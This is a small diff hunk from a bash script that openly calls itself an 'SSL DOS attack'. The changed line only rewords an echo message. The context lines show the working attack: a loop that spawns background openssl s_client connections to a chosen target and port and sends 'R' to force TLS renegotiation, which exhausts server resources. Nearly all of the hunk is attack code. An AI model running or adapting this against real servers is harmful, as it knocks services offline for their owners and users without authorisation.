@@ -27,7 +27,7 @@ read NEGOTIATE
 if [[ $NEGOTIATE = y ]]; then
 	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
 while : for i in {1..10} 
-	do echo "spawning instance"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
+	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
 done
 
 elif [[ $NEGOTIATE = n ]]; then
